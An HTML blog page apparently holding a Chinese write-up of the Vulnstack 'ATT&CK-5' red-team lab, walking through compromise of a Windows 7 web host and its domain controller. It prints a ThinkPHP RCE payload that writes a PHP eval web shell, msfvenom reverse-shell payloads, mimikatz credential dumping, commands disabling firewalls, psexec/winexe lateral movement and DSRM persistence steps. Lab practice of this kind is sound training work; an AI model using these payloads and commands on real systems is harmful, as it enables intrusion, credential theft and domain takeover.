@@ -1,0 +1,422 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>红日红队靶场ATT&amp;CK-5 | Immortal's Blog</title><meta name="author" content="Immortal723"><meta name="copyright" content="Immortal723"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ATT&amp;CK-5">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日红队靶场ATT&amp;CK-5">
+<meta property="og:url" content="https://immortal723.github.io/post/8d8aa199.html">
+<meta property="og:site_name" content="Immortal&#39;s Blog">
+<meta property="og:description" content="ATT&amp;CK-5">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://immortal723.github.io/img/ATTcharpter5.png">
+<meta property="article:published_time" content="2026-04-26T08:30:00.000Z">
+<meta property="article:modified_time" content="2026-04-26T08:31:53.832Z">
+<meta property="article:author" content="Immortal723">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://immortal723.github.io/img/ATTcharpter5.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "红日红队靶场ATT&CK-5",
+  "url": "https://immortal723.github.io/post/8d8aa199.html",
+  "image": "https://immortal723.github.io/img/ATTcharpter5.png",
+  "datePublished": "2026-04-26T08:30:00.000Z",
+  "dateModified": "2026-04-26T08:31:53.832Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Immortal723",
+      "url": "http://immortal723.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/lufei.jpg"><link rel="canonical" href="https://immortal723.github.io/post/8d8aa199.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":2,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'medium_zoom',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '红日红队靶场ATT&CK-5',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="web_bg" style="background-image: url(/img/onepiece.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/lufei.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/caomao.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/lufei.jpg" alt="Logo"><span class="site-name">Immortal's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">红日红队靶场ATT&amp;CK-5</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">红日红队靶场ATT&amp;CK-5</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-26T08:30:00.000Z" title="发表于 2026-04-26 16:30:00">2026-04-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-26T08:31:53.832Z" title="更新于 2026-04-26 16:31:53">2026-04-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="红日靶场ATT-CK-5"><a href="#红日靶场ATT-CK-5" class="headerlink" title="红日靶场ATT&amp;CK-5"></a>红日靶场ATT&amp;CK-5</h1><h2 id="0x01环境搭建"><a href="#0x01环境搭建" class="headerlink" title="0x01环境搭建"></a>0x01环境搭建</h2><ul>
+<li>下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/7/">http://vulnstack.qiyuanxuetang.net/vuln/detail/7/</a></li>
+<li>共两台主机，win7账号密码为 sun\heart:123.com sun\Administrator:dc123.com，win2008账号密码 sun\admin:2020.com后续开机要自行修改密码我这里是123.com</li>
+<li>网卡配置如下</li>
+<li><img src="/img/ETT1.png"></li>
+<li><img src="/img/ETT2.png"></li>
+<li><img src="/img/ETT3.png"></li>
+<li>ping通测试</li>
+</ul>
+<p><img src="/img/ETT4.png"></p>
+<ul>
+<li>win7开启phpstudy服务,要用域控的账号密码或者切换高权限用户才允许开启，至此环境搭建完毕</li>
+</ul>
+<p><img src="/img/ETT5.png"></p>
+<ul>
+<li><p>要使用管理员打开cmd关闭防火墙，不然kali和win8无法ping通此主机</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netsh advfirewall <span class="token builtin class-name">set</span> allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+<p><img src="/img/ETT6.png"></p>
+<h2 id="0x02信息搜集"><a href="#0x02信息搜集" class="headerlink" title="0x02信息搜集"></a>0x02信息搜集</h2><p>做个IP探测和端口扫描,发现80，445，3306都开了</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span>
+nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-Pn</span> <span class="token number">192.168</span>.135.150<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/img/ETT7.png"></p>
+<p>80端口是thinkPHP，版本为5.0.22，大部分都用工具都可以拿下</p>
+<p><img src="/img/ETT8.png"></p>
+<p><img src="/img/ETT9.png"></p>
+<h2 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h2><p>可以看到有很多漏洞都可以打,还爆出了数据库的账号密码，思路用文件上传getshell或者工具一键getshell，要速度就可以选工具getshell，自己写就改RCE的内容，我这里直接getshell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">payload：
+/?s<span class="token operator">=</span>index/think<span class="token punctuation">\</span>app/invokefunction<span class="token operator">&amp;</span><span class="token assign-left variable">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>file_put_contents<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>test.php<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&lt;</span>?php eval<span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/img/ETT10.png"></p>
+<p><img src="/img/ETT11.png"></p>
+<p>蚁剑连接后信息搜集,权限还不小但不是system权限，还存在内网网段192.168.138.0&#x2F;24，以及另一台机器DC</p>
+<p><img src="/img/ETT12.png"></p>
+<p><img src="/img/ETT13.png"></p>
+<p>方便后续内网穿透和横向移动我们这里还是用msf来用大马反弹shell方便,但是上线马之前我们看看看有没有杀毒软件，没有那就没有后顾之忧了</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tasklist <span class="token parameter variable">-svc</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/img/ETT14.png"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#kali执行</span>
+msfconsole
+msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.135.128 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">9999</span> <span class="token parameter variable">-f</span> exe <span class="token operator">></span> shell.exe
+use exploit/multi/handler
+<span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp
+<span class="token builtin class-name">set</span> LHOST <span class="token punctuation">[</span>kali IP<span class="token punctuation">]</span>
+<span class="token builtin class-name">set</span> LPORT <span class="token punctuation">[</span>端口<span class="token punctuation">]</span>
+run
+
+<span class="token comment">#win7执行</span>
+shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/img/ETT15.png"></p>
+<h2 id="0x04内网搜集"><a href="#0x04内网搜集" class="headerlink" title="0x04内网搜集"></a>0x04内网搜集</h2><p>成功上线后，简单利用msf提个权</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">getuid  <span class="token comment">#发现还不是管理员权限</span>
+getsystem <span class="token comment">#提权成功</span>
+shell
+chcp <span class="token number">65001</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>![]&#x2F;img&#x2F;ETT16.png)</p>
+<p>进行内网网段的全面搜集，发现未成功然后发现我们的账号可能还是不够域的权限，虽然显示不行，但是有了这个域名了直接ping就好了</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net user /domain
+net group <span class="token string">"domain admins"</span> /domain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/img/ETT17.png"></p>
+<p><img src="/img/ETT18.png"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> sun.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/img/ETT19.png"></p>
+<p>发现域控DC-192.168.138.138，看看能不能用kiwi将域凭证抓取</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run post/multi/manage/autoroute
+run autoroute <span class="token parameter variable">-p</span>
+load kiwi
+migrate <span class="token number">484</span>
+creds_all
+kiwi_cmd sekurlsa::logonPasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/img/ETT20.png"></p>
+<p><img src="/img/ETT21.png"></p>
+<p><img src="/img/ETT22.png"></p>
+<p>找到了域控的账号密码Sun\Administrator:dc123.com，Sun\leo:123.com</p>
+<h2 id="0x05横向移动"><a href="#0x05横向移动" class="headerlink" title="0x05横向移动"></a>0x05横向移动</h2><p>先做内网穿透再进行横向移动,配置完后要改&#x2F;etc&#x2F;proxychains4.conf</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">background
+use auxiliary/server/socks_proxy
+<span class="token builtin class-name">set</span> SRVHOST <span class="token number">127.0</span>.0.1
+<span class="token builtin class-name">set</span> VERSION <span class="token number">5</span>
+run
+<span class="token function">jobs</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/img/ETT23.png"></p>
+<p><img src="/img/ETT24.png"></p>
+<p>可以看到192.168.138.138开了445，可以利用psexec模块进行攻击</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/windows/smb/psexec
+<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.138.138
+<span class="token builtin class-name">set</span> SMBDomain SUN
+<span class="token builtin class-name">set</span> SMBUser administrator
+<span class="token builtin class-name">set</span> SMBPass dc123.com
+<span class="token builtin class-name">set</span> payload windows/meterpreter/bind_tcp
+<span class="token builtin class-name">set</span> rhost <span class="token number">192.168</span>.138.138
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>失败了，大概率是因为域控开了防火墙的原因</p>
+<p><img src="/img/ETT25.png"></p>
+<p>利用win7管道符连接关闭防火墙先</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#回到会话</span>
+net use <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.138.138<span class="token punctuation">\</span>ipc$ <span class="token string">"dc123.com"</span> /user:<span class="token string">"administrator"</span>  <span class="token comment">#用账号密码创建管道符</span>
+sc <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.138.138 create unablefirewall <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">"netsh advfirewall set allprofiles state off"</span>  <span class="token comment">#创建关闭防火墙服务</span>
+sc <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.138.138 start unablefirewall   <span class="token comment">#执行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/img/ETT26.png"></p>
+<p><img src="/img/ETT27.png"></p>
+<p>发现还是不行，我就换了个定时任务的方法，发现还是有问题</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.135.128 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">8787</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> hacker.exe
+
+<span class="token comment">#meterpreter执行</span>
+copy hacker.exe <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.138.138<span class="token punctuation">\</span>c$
+<span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.138.138<span class="token punctuation">\</span>c$
+net <span class="token function">time</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.138.138   <span class="token comment">#自行修改下条命令后面的/st参数</span>
+schtasks /create /tn <span class="token string">"cmd"</span> /tr C:<span class="token punctuation">\</span>hacker.exe /sc once /st <span class="token number">20</span>:59 /S <span class="token number">192.168</span>.138.138 /RU System /u administrator /p <span class="token string">"dc123.com"</span>  <span class="token comment">#计时任务</span>
+
+background
+use exploit/multi/handler
+<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp
+<span class="token builtin class-name">set</span> LHOST <span class="token punctuation">[</span>kali IP<span class="token punctuation">]</span>
+<span class="token builtin class-name">set</span> LPORT <span class="token punctuation">[</span>端口<span class="token punctuation">]</span>
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/img/ETT28.png"></p>
+<p>再换一个不用msf模块的方法,总算是成功了，拿下了域控的主机</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 winexe <span class="token parameter variable">-U</span> administrator%dc123.com //192.168.138.138 <span class="token string">"cmd.exe /c chcp 65001 &amp;&amp; cmd.exe"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/img/ETT29.png"></p>
+<h2 id="0x06权限维持"><a href="#0x06权限维持" class="headerlink" title="0x06权限维持"></a>0x06权限维持</h2><p>在域控制器上，DSRM账号的表现形式是本地的管理员Administrator用户，也就是说本地管理员Administrator用户等于DSRM账号，这里我们就要去修改密码</p>
+<p>开启3389方便我们后续修改注册表操作</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">REG ADD <span class="token string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t REG_DWORD /d <span class="token number">0</span> /f
+proxychains4 rdesktop <span class="token parameter variable">-u</span> administrator <span class="token parameter variable">-p</span> dc123.com <span class="token number">192.168</span>.138.138<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#cmd中执行</span>
+ntdsutil    // 进入ntdsutil
+<span class="token builtin class-name">set</span> dsrm password    // 设置DSRM账户的密码
+reset password on server null    // 在当前域控制器上恢复DSRM密码
+<span class="token operator">&lt;</span>password<span class="token operator">></span>    // 输入新密码
+<span class="token operator">&lt;</span>password<span class="token operator">></span>    // 再输入新密码
+q    //退出DSRM密码设置模式
+q    // 退出ntdsutil<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>但是我这里翻车了不知道干嘛就是连不上3389,试了好几种方法，而且我用msf关闭192.168.138.138通过管道符关闭这个NLA也没关掉，没招了，应该是这个rdesktop协议有问题，我换了其他还是正整不上就放弃了哈哈</p>
+<p><img src="/img/ETT30.png"></p>
+<h2 id="0x07痕迹清理"><a href="#0x07痕迹清理" class="headerlink" title="0x07痕迹清理"></a>0x07痕迹清理</h2><p>关于权限维持我也是参考别人的权限维持和痕迹清理</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/5jKpv5XfJyJ1c8iSrUg8lw">https://mp.weixin.qq.com/s/5jKpv5XfJyJ1c8iSrUg8lw</a></li>
+</ul>
+<h2 id="0x08总结"><a href="#0x08总结" class="headerlink" title="0x08总结"></a>0x08总结</h2><p>这个靶场准备是演示这个后渗透的一些思路和方法的，奈何环境又双叒叕翻车了，所以在靶场搭建的时候和渗透的时候我们还是要注意环境的一些变化，才不会经常出现卡的情况</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://immortal723.github.io">Immortal723</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://immortal723.github.io/post/8d8aa199.html">https://immortal723.github.io/post/8d8aa199.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Immortal723.github.io" target="_blank">Immortal's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="addtoany"><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class="a2a_button_facebook"></a><a class="a2a_button_x"></a><a class="a2a_button_wechat"></a><a class="a2a_button_sina_weibo"></a><a class="a2a_button_facebook_messenger"></a><a class="a2a_button_email"></a><a class="a2a_button_copy_link"></a><a class="a2a_dd" target="_blank" rel="noopener" href="https://www.addtoany.com/share"></a></div></div><script async="async" src="https://static.addtoany.com/menu/page.js"></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/post/8d8aa198.html" title="红日红队靶场ATT&amp;CK-4"><img class="cover" src="/img/ATTcharpter4.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">红日红队靶场ATT&CK-4</div></div><div class="info-2"><div class="info-item-1">红日靶场ATT&amp;CK-40x01环境搭建 下载地址：http://vulnstack.qiyuanxuetang.net/vuln/detail/6/  机器账号密码如下：  #Web ubuntu&#x2F;ubuntu #win7 douser&#x2F;Dotest123 #DC administrator&#x2F;Test2008  后续自行修改密码我这里换成Admin123        ubutnu机子先要开三个服务，并且与kali和dc看是否能ping通 ifconfig sudo docker start ec 17 09 ad sudo docker ps ping [kali-IP] ping [Dc-IP]     至此环境搭建完毕 0x02信息搜集老样子先找下web的ip arp-scan -l   对这个IP进行完整的探测的扫描，四个端口都开了服务依次进行探测 nmap -p- -sV -Pn -O -T5 192.168.111.132   2001端口是struts2框架  2002端口是Tomcat框架  2003是未授权的phpmyad...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/lufei.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Immortal723</div><div class="author-info-description">一名专注于 Web安全 / 漏洞挖掘 / CTF 的技术爱好者</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Immortal723"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Immortal723" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">🎯 记录我的安全技术学习、实战笔记与成长历程 | 探索永远在路上</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BAATT-CK-5"><span class="toc-number">1.</span> <span class="toc-text">红日靶场ATT&amp;CK-5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">0x01环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">0x02信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">0x03漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04%E5%86%85%E7%BD%91%E6%90%9C%E9%9B%86"><span class="toc-number">1.4.</span> <span class="toc-text">0x04内网搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.5.</span> <span class="toc-text">0x05横向移动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.6.</span> <span class="toc-text">0x06权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="toc-number">1.7.</span> <span class="toc-text">0x07痕迹清理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">0x08总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/8d8aa199.html" title="红日红队靶场ATT&amp;CK-5"><img src="/img/ATTcharpter5.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日红队靶场ATT&amp;CK-5"/></a><div class="content"><a class="title" href="/post/8d8aa199.html" title="红日红队靶场ATT&amp;CK-5">红日红队靶场ATT&amp;CK-5</a><time datetime="2026-04-26T08:30:00.000Z" title="发表于 2026-04-26 16:30:00">2026-04-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/8d8aa198.html" title="红日红队靶场ATT&amp;CK-4"><img src="/img/ATTcharpter4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日红队靶场ATT&amp;CK-4"/></a><div 